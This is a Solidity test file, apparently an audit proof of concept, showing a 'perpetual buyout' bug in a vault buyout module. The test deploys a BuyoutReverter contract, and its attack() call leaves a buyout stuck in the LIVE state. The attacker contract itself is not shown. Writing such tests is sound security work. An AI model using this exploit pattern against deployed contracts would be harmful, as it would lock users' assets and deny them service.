// SPDX-License-Identifier: Unlicense
pragma solidity 0.8.13;

import "./BuyoutReverter.sol";
import "./TestUtil.sol";
import "../src/targets/Supply.sol";

contract BuyoutTest is TestUtil {
    /// =================
    /// ===== SETUP =====
    /// =================
    function setUp() public {
        setUpContract();
        alice = setUpUser(111, 1);
        bob = setUpUser(222, 2);

        vm.label(address(this), "BuyoutTest");
        vm.label(alice.addr, "Alice");
        vm.label(bob.addr, "Bob");
    }

     /// ======================
    /// ===== END BUYOUT =====
    /// ======================
    // function testBugs1() public {
    //     initializeBuyout(alice, bob, TOTAL_SUPPLY, HALF_SUPPLY, true);

    //     bob.buyoutModule.start{value: 1 ether}(vault);
    //     alice.buyoutModule.sellFractions(vault, 1000);
    //     vm.warp(rejectionPeriod + 1);

    //     assertEq(getFractionBalance(bob.addr), 0);
    //     assertEq(getFractionBalance(buyout), 6000);

    //     vm.startPrank(IVault(vault).owner());
    //     IVault(vault).transferOwnership(bob.addr);
    //     vm.stopPrank();

    //     bob.buyoutModule.end(vault, burnProof);

    //     assertEq(getFractionBalance(bob.addr), 0);
    //     assertEq(getFractionBalance(buyout), 0);
    // }

    function testPerpetualBuyoutBug() public {
        initializeBuyout(alice, bob, TOTAL_SUPPLY, HALF_SUPPLY, true);

        address buyoutUnderlying = bob.buyoutModule.proxyContract();

        BuyoutReverter buyoutReverter = new BuyoutReverter(vault, buyoutUnderlying, burnProof);

        assert(bob.addr != address(buyoutReverter));

        (address token,) = registry.vaultToToken(vault);

        vm.startPrank(address(buyoutReverter));
        FERC1155(token).setApprovalForAll(buyoutUnderlying, true);
        vm.stopPrank();

        // ATTAAAAAAAAAAAAAACK!
        buyoutReverter.attack{value: 1 ether}();

        (,address proposer,,,,) = bob.buyoutModule.buyoutInfo(vault);
        assertEq(proposer, address(buyoutReverter));

        vm.warp(rejectionPeriod + 1);

        IBuyout(buyoutModule).end(vault, burnProof);

        (,,State state,,,) = bob.buyoutModule.buyoutInfo(vault);

        // The buyout proposal is still LIVE!
        assertEq(uint256(state), uint256(State.LIVE));
    }


}
